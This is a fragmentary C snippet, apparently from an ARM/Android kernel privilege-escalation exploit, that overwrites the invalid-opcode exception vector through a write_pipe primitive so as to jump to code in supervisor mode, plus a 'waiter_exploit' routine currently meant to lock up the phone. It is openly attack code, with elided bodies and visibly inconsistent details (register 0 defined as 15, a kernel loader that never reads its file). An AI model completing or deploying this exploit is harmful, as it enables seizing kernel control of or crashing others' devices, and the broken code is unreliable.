...
#define ARM_INVALID_OPCODE_VECTOR 0x00000004
#define ARM_REG0 15
#define ARM_PC 15
...
#define JUMP_TO_R0_AS_SUPERVISOR_MODE MOV_REG_ASR_IMM(ARM_PC, ARM_REG0, 0)
...
void load_kernel_to_shared_buffer(char* new_kernel_path){
   unsigned int kernel_size;
   char* kernel_data;
   struct stat st;
   stat(new_kernel_path, &st);
   kernel_size = st.st_size;
   
   kernel_data = (unsigned long)mmap(NULL, kernel_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
   
   
}

//this function may destroy the state of the program and possibly the kernel
inline void run_as_supervisor(void* new_pc){
   int old_r0;
   write_pipe(ARM_INVALID_OPCODE_VECTOR, JUMP_TO_R0_AS_SUPERVISOR_MODE, 4);
...
int waiter_exploit() {
    ...
    run_as_supervisor((void*)0x68398885);//just try to lock up the phone for now
